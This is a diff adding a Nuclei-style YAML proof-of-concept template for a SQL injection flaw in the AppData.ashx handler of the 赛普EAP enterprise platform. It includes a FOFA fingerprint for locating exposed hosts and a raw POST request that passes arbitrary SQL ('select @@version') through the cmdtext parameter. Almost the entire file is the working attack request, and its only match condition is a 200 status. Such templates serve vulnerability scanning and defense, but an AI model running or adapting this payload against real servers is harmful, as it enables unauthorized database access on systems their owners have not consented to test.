@@ -1,0 +1,34 @@
+id: poc-adgvzlb1zslpchgv
+info:
+  name: 赛普EAP企业适配管理平台 AppData.ashx 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/adgvzlb1zslpchgv'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: adgvzlb1zslpchgv
+    fofa: body="IDWebSoft/"
+http:
+- raw:
+  - 'POST /IDWebSoft/AppData.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    action=GetDataTableByText&cmdtext=select @@version;'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
